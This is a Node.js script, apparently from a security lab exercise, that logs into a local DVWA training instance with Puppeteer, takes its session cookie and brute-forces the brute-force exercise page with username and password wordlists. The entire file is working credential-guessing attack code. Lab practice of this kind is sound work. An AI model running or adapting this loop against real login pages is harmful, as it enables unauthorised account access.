const fs = require("node:fs/promises");
const puppeteer = require("puppeteer");
const ipaddress = "10.115.2.9";

async function getPHPSESSID() {
  // Browser öffnen
  const browser = await puppeteer.launch();
  const page = await browser.newPage();

  // DVWA öffnen
  await page.goto("http://10.115.2.9:4280/");

  // Screen size
  await page.setViewport({ width: 1080, height: 1024 });

  // Login
  await page.type('input[name="username"]', "admin");
  await page.type('input[name="password"]', "password");
  await page.click('input[type="submit"]');
  await page.waitForNavigation();

  // Cookies holen
  const cookies = await page.cookies();
  console.log(cookies);
  await browser.close();
  return cookies.find((cookie) => cookie.name === "PHPSESSID").value;

}

const main = async () => {
  try {
    // Wordlists laden
    const userData = await fs.readFile("usernames.txt", "utf8");
    const passData = await fs.readFile("password.txt", "utf8");

    // Usernames und Passwörter in Arrays umwandeln
    const usernames = userData
      .trim()
      .split("\n")
      .map((line) => line.trim());
    const passwords = passData
      .trim()
      .split("\n")
      .map((line) => line.trim());

    // PHPSESSID holen
    const PHPSESSID = await getPHPSESSID();

    // Brute-Force
    for (const username of usernames) {
      for (const password of passwords) {
        const response = await fetch(
          `http://${ipaddress}:4280/vulnerabilities/brute/?username=${username}&password=${password}&Login=Login#`,
          {
            method: "GET",
            headers: {
              Cookie: `PHPSESSID=${PHPSESSID}; security=low`,
            },
          }
        );
        const text = await response.text();
        if (text.includes("incorrect")) {
          console.log(
            `Username: ${username}, Password: ${password} is incorrect`
          );
        } else {
          console.log("Hacked successfully!");
          console.log(`Username: ${username}, Password: ${password}`);
          process.exit();
        }
      }
    }
  } catch (error) {
    console.error("Error in main:", error);
  }
};

main();
 